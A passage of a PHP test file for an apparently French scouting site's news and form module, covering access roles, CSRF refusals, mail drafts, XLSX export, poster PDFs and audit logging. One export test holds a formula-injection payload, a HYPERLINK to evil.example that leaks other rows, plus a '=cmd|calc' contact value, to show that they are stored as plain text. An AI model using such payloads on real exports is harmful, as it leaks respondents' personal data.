        $this->assertStringContainsString('parent@test.com', $response->getBody());
    }

    public function testResponsesPageRejectsRoleBelowResponseRoleMin(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'identified');
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);

        $response = $this->formController->responses(new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(403, $response->getStatusCode());
    }

    // --- IT-06: "Écrire aux répondants" ---
    //
    // The route itself is `chief` while this page is `intendant`, and the
    // guard is what enforces that (NewsRbacTest covers it). What is left
    // to this file is the controller's own two refusals — the module being
    // absent, and the CSRF token — plus the shape of what it hands over.

    public function testTheMailDraftButtonIsAbsentWithoutTheMassMailModule(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $body = $this->formController->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        // $this->formController is built with no draft provider, which is
        // exactly what the composition root passes when mass_mail is off.
        $this->assertStringNotContainsString('Écrire aux répondants', $body);
        $this->assertStringContainsString('Exporter en Excel', $body, 'the rest of the page is untouched');
    }

    public function testCreatingAMailDraftIsNotFoundWithoutTheMassMailModule(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $token = CsrfGuard::generateToken();

        $response = $this->formController->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], ['_csrf_token' => $token], [], []),
            ['id' => (string) $articleId]
        );

        // Not a 500 and not an error page: the feature simply is not
        // offered, so the route has nothing to reach.
        $this->assertSame(404, $response->getStatusCode());
    }

    public function testTheMailDraftButtonAppearsWithTheModuleAndAChiefRole(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $body = $this->formControllerWithMassMail()->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('Écrire aux répondants', $body);
    }

    public function testTheMailDraftButtonIsHiddenFromAnIntendant(): void
    {
        // The page opens at `intendant`, the mail merge starts at `chief`.
        // The button is hidden for the gap — presentation only; the route's
        // own floor is the boundary.
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'intendant');
        $articleId = $this->articleWithOneResponse('intendant');

        $body = $this->formControllerWithMassMail()->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringNotContainsString('Écrire aux répondants', $body);
    }

    public function testCreatingAMailDraftHandsOverTheExportsColumnsAndRedirects(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $token = CsrfGuard::generateToken();

        $captured = [];
        $draft = $this->recordingDraftProvider($captured);

        $response = $this->formControllerWithMassMail($draft)->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], ['_csrf_token' => $token], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(302, $response->getStatusCode());
        $this->assertSame('/mass-mail/7', $response->getHeaders()['Location'] ?? null);

        // Same first column and same field order as the XLSX export, read
        // from the same isNonInput() rule rather than restated.
        $this->assertSame(['Contact', 'Nom'], $captured['columns']);
        $this->assertSame([
            ['email' => 'parent@test.com', 'values' => ['Contact' => 'parent@test.com', 'Nom' => 'Alice']],
        ], $captured['rows']);
    }

    public function testCreatingAMailDraftRefusesAnInvalidCsrfToken(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $response = $this->formControllerWithMassMail()->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], ['_csrf_token' => 'wrong'], [], []),
            ['id' => (string) $articleId]
        );

        // guardCsrf() sends the user back with a flash rather than erroring,
        // so the status is a redirect either way — WHERE it goes is the
        // assertion that distinguishes a refusal from a success.
        $this->assertSame(
            '/news/' . $articleId . '/form/responses',
            $response->getHeaders()['Location'] ?? null,
            'a bad token must land back on the responses page, never in the composer'
        );
    }

    private function articleWithOneResponse(string $responseRoleMin = 'chief'): int
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, $responseRoleMin, false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        return $articleId;
    }

    private function formControllerWithMassMail(?\Modules\MassMail\Api\MassMailDraftInterface $draft = null): FormController
    {
        $draft ??= $this->stubDraftProvider();

        return new FormController(
            $this->twig,
            $this->articleService,
            $this->formService,
            $this->responseService,
            $this->scoutYearService,
            $this->journalService,
            null,
            null,
            $draft
        );
    }

    private function stubDraftProvider(): \Modules\MassMail\Api\MassMailDraftInterface
    {
        $stub = $this->createMock(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $stub->method('createMergeDraft')->willReturn('/mass-mail/7');

        return $stub;
    }

    /**
     * @param array<string, mixed> $captured
     */
    private function recordingDraftProvider(array &$captured): \Modules\MassMail\Api\MassMailDraftInterface
    {
        $stub = $this->createMock(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $stub->method('createMergeDraft')->willReturnCallback(
            function (string $label, string $subject, array $columns, array $rows) use (&$captured): string {
                $captured = ['label' => $label, 'subject' => $subject, 'columns' => $columns, 'rows' => $rows];

                return '/mass-mail/7';
            }
        );

        return $stub;
    }

    public function testExportResponsesReturnsAnXlsxFile(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        $response = $this->formController->exportResponses(new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', $response->getHeaders()['Content-Type']);
        $this->assertStringStartsWith('PK', $response->getBody());
    }

    /**
     * POST /news/{id}/form/submit is public, so a form answer is
     * attacker-controlled. It must never become a live formula in the
     * XLSX a chief opens — the CSV/spreadsheet formula-injection class,
     * where =HYPERLINK(...) would exfiltrate the other rows' PII on open.
     */
    public function testExportedAnswersAreWrittenAsTextNotFormulas(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $payload = '=HYPERLINK("https://evil.example/?d="&A2,"Cliquez")';
        $this->responseRepository->create($formId, null, null, '=cmd|calc', [$fieldId => $payload], null, null);

        $response = $this->formController->exportResponses(
            new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []),
            ['id' => (string) $articleId]
        );

        $tmp = tempnam(sys_get_temp_dir(), 'news_export_') . '.xlsx';
        file_put_contents($tmp, $response->getBody());
        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($tmp)->getActiveSheet();
        @unlink($tmp);

        // Column 1 = contact, column 2 = the answer. Both are attacker text.
        $contactCell = $sheet->getCell([1, 2]);
        $answerCell = $sheet->getCell([2, 2]);

        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $answerCell->getDataType());
        $this->assertSame($payload, $answerCell->getValue(), 'stored verbatim as text, not evaluated');
        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $contactCell->getDataType());
        $this->assertSame('=cmd|calc', $contactCell->getValue());
    }

    public function testEditResponsePageRendersForOwnerWhileOpen(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $responseId = $this->responseRepository->create($formId, 55, null, 'me@test.com', [$fieldId => 'Bob'], null, null);

        AuthSession::login(55, 'me@test.com', 'identified');

        $response = $this->formController->editResponse(
            new Request('GET', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [], [], []),
            ['id' => (string) $articleId, 'response_id' => (string) $responseId]
        );

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Bob', $response->getBody());
    }

    public function testEditResponsePageRejectsADifferentAccount(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, null, null, false, 'chief', false, null);
        $responseId = $this->responseRepository->create($formId, 55, null, 'me@test.com', [], null, null);

        AuthSession::login(56, 'other@test.com', 'identified');

        $response = $this->formController->editResponse(
            new Request('GET', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [], [], []),
            ['id' => (string) $articleId, 'response_id' => (string) $responseId]
        );

        $this->assertSame(403, $response->getStatusCode());
    }

    public function testPosterDownloadReturnsAPdf(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp d\'été', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $this->articleRepository->setShortUrlCode($id, 'abc123');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('application/pdf', $response->getHeaders()['Content-Type']);
        $this->assertStringStartsWith('%PDF-', $response->getBody());
    }

    /**
     * The poster carries the article's title, its summary and a QR code to
     * its short URL — so it needs show()'s visibility gate. Without it a
     * chief blocked from an admin-visibility article at /news/{id} could
     * still read all three straight out of the PDF.
     */
    public function testPosterIsRefusedForAnArticleTheViewerMayNotSee(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Secret CU', Article::VISIBILITY_ADMIN, false, null, null, $this->chiefAccountId, 'Résumé confidentiel.');
        $this->articleRepository->setShortUrlCode($id, 'secret1');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
        $this->assertStringNotContainsString('%PDF-', $response->getBody());
    }

    public function testPosterIsServedForTheSameArticleToARoleThatMaySeeIt(): void
    {
        AuthSession::login($this->chiefAccountId, 'admin@test.com', 'admin');
        $id = $this->articleRepository->create('Secret CU', Article::VISIBILITY_ADMIN, false, null, null, $this->chiefAccountId, 'Résumé confidentiel.');
        $this->articleRepository->setShortUrlCode($id, 'secret2');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringStartsWith('%PDF-', $response->getBody());
    }

    public function testPosterDownloadIncludesTheFeaturedImageWhenItExists(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $uploadHandler = new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir());
        $fileId = $uploadHandler->handle($this->fakeUploadedImage(), 'news/images', ['image/jpeg'], 5 * 1024 * 1024, 'public', 'news', $this->chiefAccountId);

        $id = $this->articleRepository->create('Camp d\'été', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', $fileId);
        $this->articleRepository->setShortUrlCode($id, 'abc124');

        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringStartsWith('%PDF-', $response->getBody());
    }

    /**
     * form_finance_account_id used to be stored verbatim, and later drove
     * Service\ResponseService's createReceivable() — so an author could bind
     * a form's payments to any account id at all, including a draft or
     * archived one the picker never offered. It is now validated against the
     * very list the picker is built from.
     *
     * @return array{0: NewsController, 1: string} controller + a valid CSRF token
     */
    private function controllerWithFinanceAccounts(): array
    {
        $financeAccount = $this->createMock(FinanceAccountInterface::class);
        $financeAccount->method('getConfiguredAccounts')->willReturn([
            ['id' => 42, 'name' => 'Compte unité', 'iban' => null, 'holder_name' => null, 'section_id' => null],
        ]);

        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir()),
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService, $financeAccount
        );

        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        return [$controller, CsrfGuard::generateToken()];
    }

    /**
     * @return array<string, string>
     */
    private function formArticleBody(string $csrfToken, string $financeAccountId): array
    {
        return [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp payant',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'has_form' => '1',
            'form_access' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'form_finance_account_id' => $financeAccountId,
            'fields_json' => (string) json_encode([
                ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
            ]),
        ];
    }

    public function testAnUnofferedFinanceAccountIsNotBoundToTheForm(): void
    {
        [$controller, $csrfToken] = $this->controllerWithFinanceAccounts();

        // 99 is not in getConfiguredAccounts() — never offered by the picker.
        $request = new Request('POST', '/news', [], $this->formArticleBody($csrfToken, '99'), [], []);
        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $controller->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $form = $this->formService->findByArticleId($article->id);
        $this->assertNotNull($form);
        $this->assertNull($form->financeAccountId, 'an unoffered account must not be bound');
    }

    public function testAnOfferedFinanceAccountIsStillBoundNormally(): void
    {
        [$controller, $csrfToken] = $this->controllerWithFinanceAccounts();

        $request = new Request('POST', '/news', [], $this->formArticleBody($csrfToken, '42'), [], []);
        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $controller->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $form = $this->formService->findByArticleId($article->id);
        $this->assertNotNull($form);
        $this->assertSame(42, $form->financeAccountId);
    }

    /**
     * NewsException is a Core\Exception\UserFacingException, and store()
     * renders its message into the editor — so an upload failure must not be
     * re-labelled as user-facing just by being re-wrapped. The handler's own
     * sentence survives only because Core\File\UploadException claims to be
     * fit for a visitor; anything else propagates instead.
     */
    public function testAnImageUploadFailureIsNotRelabelledAsUserFacing(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();
        $_FILES['image'] = $this->fakeUploadedImage();

        $uploadHandler = $this->createMock(UploadHandler::class);
        $uploadHandler->method('handle')->willThrowException(
            new \Core\File\UploadException('Le fichier dépasse la taille maximale de 5 Mo.')
        );
        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService,
            new SeoKeywordService(null), new PosterPdfService(), $this->scoutYearService,
            $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, $uploadHandler,
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService
        );

        $response = $controller->store(new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []), []);

        $this->assertSame(422, $response->getStatusCode());
        $body = $response->getBody();
        $this->assertStringContainsString('taille maximale', $body);
        $this->assertSame(0, count($this->articleRepository->findAll()));
    }

    /**
     * The list/home cards render /files/{id}/thumb and the detail page
     * /files/{id}/md — FileController::variant() never falls back to the
     * original, so the upload itself must leave both derivatives behind.
     */
    public function testStoringAnArticleImageGeneratesItsThumbAndMdDerivatives(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $fileRepository = new FileRepository($this->pdo);
        $variantService = new \Core\Photo\ImageVariantService(
            $fileRepository, new \Core\Photo\ImageVariantProcessor(), sys_get_temp_dir()
        );
        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler($fileRepository, sys_get_temp_dir()),
            $fileRepository, sys_get_temp_dir(), $this->journalService, null, null, $variantService
        );

        $_FILES['image'] = $this->fakeUploadedImage();
        $response = $controller->store(new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp illustré',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []), []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertNotNull($article->imageFileId);
        $file = $fileRepository->findById($article->imageFileId);
        $this->assertNotNull($file);
        $this->assertNotNull($variantService->resolvePath($file->relativePath, 'thumb'));
        $this->assertNotNull($variantService->resolvePath($file->relativePath, 'md'));
    }

    public function testStoreCreatesArticleWithFormAndRedirects(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $fieldsJson = json_encode([
            ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
        ]);

        $request = new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
            'has_form' => '1',
            'form_access' => 'public',
            'form_response_limit' => 'unlimited',
            'form_response_role_min' => 'chief',
            'fields_json' => $fieldsJson,
        ], [], []);

        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $this->assertSame('Nouveau camp', $article->title);
        $this->assertTrue($article->hasForm);
        $this->assertNotNull($article->imageFileId);
    }

    /**
     * @dataProvider visibilityAccessProvider
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('visibilityAccessProvider')]
    public function testStoreDerivesFormAccessFromVisibilityNotFromRequest(string $visibility, string $expectedAccess): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $fieldsJson = json_encode([
            ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
        ]);

        $request = new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp',
            'summary' => 'Un résumé en une phrase.',
            'visibility' => $visibility,
            // Deliberately the opposite of $expectedAccess — there is no
            // "Accès au formulaire" control anymore, so this must be
            // ignored and derived from visibility instead.
            'form_access' => $expectedAccess === NewsForm::ACCESS_PUBLIC ? 'identified' : 'public',
            'fields_json' => $fieldsJson,
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
        $article = $this->articleRepository->findAll()[0];
        $form = $this->formRepository->findByArticleId($article->id);
        $this->assertSame($expectedAccess, $form->access);
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function visibilityAccessProvider(): array
    {
        return [
            'public visibility needs no login' => [Article::VISIBILITY_PUBLIC, NewsForm::ACCESS_PUBLIC],
            'direct_link visibility needs no login' => [Article::VISIBILITY_DIRECT_LINK, NewsForm::ACCESS_PUBLIC],
            'chief visibility requires login' => [Article::VISIBILITY_CHIEF, NewsForm::ACCESS_IDENTIFIED],
            'admin visibility requires login' => [Article::VISIBILITY_ADMIN, NewsForm::ACCESS_IDENTIFIED],
        ];
    }

    public function testCreateEditorPageDefaultsSeoStopDateToSixMonthsFromNow(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);

        $expected = (new \DateTimeImmutable('+6 months'))->format('Y-m-d');
        $this->assertStringContainsString('id="seo_stop_date" value="' . $expected . '"', $response->getBody());
    }

    /**
     * @return array{name: string, tmp_name: string, error: int, size: int, type: string}
     */
    private function fakeUploadedImage(): array
    {
        $path = tempnam(sys_get_temp_dir(), 'news_test_image_') . '.jpg';
        $image = imagecreatetruecolor(10, 10);
        imagejpeg($image, $path);
        imagedestroy($image);

        return ['name' => 'photo.jpg', 'tmp_name' => $path, 'error' => UPLOAD_ERR_OK, 'size' => filesize($path), 'type' => 'image/jpeg'];
    }

    public function testDeleteRejectsNonAuthorChief(): void
    {
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        AuthSession::login(999, 'other-chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $request = $this->getMockBuilder(Request::class)
            ->setConstructorArgs(['DELETE', '/news/' . $id, [], [], [], []])
            ->onlyMethods(['getRawBody'])
            ->getMock();
        $request->method('getRawBody')->willReturn(json_encode(['_csrf_token' => $csrfToken]));

        $response = $this->newsController->delete($request, ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
        $this->assertNotNull($this->articleRepository->findById($id));
    }

    public function testDeleteJournalsTheDeletionByTheAuthor(): void
    {
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'article_deleted', 'info', $this->anything(), ['article_id' => $id], $this->chiefAccountId);

        $request = $this->getMockBuilder(Request::class)
            ->setConstructorArgs(['DELETE', '/news/' . $id, [], [], [], []])
            ->onlyMethods(['getRawBody'])
            ->getMock();
        $request->method('getRawBody')->willReturn(json_encode(['_csrf_token' => $csrfToken]));

        $response = $this->newsController->delete($request, ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
    }

    public function testStoreJournalsTheArticleCreation(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $csrfToken = CsrfGuard::generateToken();

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'article_created', 'info', $this->anything(), $this->anything(), $this->chiefAccountId);

        $request = new Request('POST', '/news', [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Nouveau camp',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->store($request, []);

        $this->assertSame(302, $response->getStatusCode());
    }

    public function testUpdateJournalsTheArticleUpdate(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId, 'Résumé.', null);
        $csrfToken = CsrfGuard::generateToken();

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'article_updated', 'info', $this->anything(), ['article_id' => $id], $this->chiefAccountId);

        $request = new Request('POST', '/news/' . $id, [], [
            '_csrf_token' => $csrfToken,
            'title' => 'Camp modifié',
            'summary' => 'Un résumé en une phrase.',
            'body_html' => '<p>Bienvenue</p>',
            'visibility' => 'public',
        ], [], []);
        $_FILES['image'] = $this->fakeUploadedImage();

        $response = $this->newsController->update($request, ['id' => (string) $id]);

        $this->assertSame(302, $response->getStatusCode());
    }

    public function testUpdateResponseJournalsTheResponseUpdate(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $responseId = $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        // canEditResponse() only allows an admin (or the response's own
        // author) to edit someone else's anonymous submission.
        AuthSession::login($this->chiefAccountId, 'admin@test.com', 'admin');

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'form_response_updated', 'info', $this->anything(), $this->anything(), $this->chiefAccountId);

        $csrfToken = CsrfGuard::generateToken();
        $request = new Request('POST', '/news/' . $articleId . '/form/responses/' . $responseId . '/edit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alicia',
        ], [], []);

        $response = $this->formController->updateResponse($request, ['id' => (string) $articleId, 'response_id' => (string) $responseId]);

        $this->assertSame(302, $response->getStatusCode());
    }

    public function testSubmitJournalsTheResponseSubmission(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'form_response_submitted', 'info', $this->anything(), $this->anything(), null);

        $csrfToken = CsrfGuard::generateToken();
        $submitRequest = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alice',
        ], [], []);

        $response = $this->formController->submit($submitRequest, ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
    }

    public function testExportResponsesJournalsTheExport(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        $this->journalService->expects($this->once())->method('log')
            ->with('news', 'form_responses_exported', 'info', $this->anything(), $this->anything(), $this->chiefAccountId);

        $response = $this->formController->exportResponses(new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
    }
}
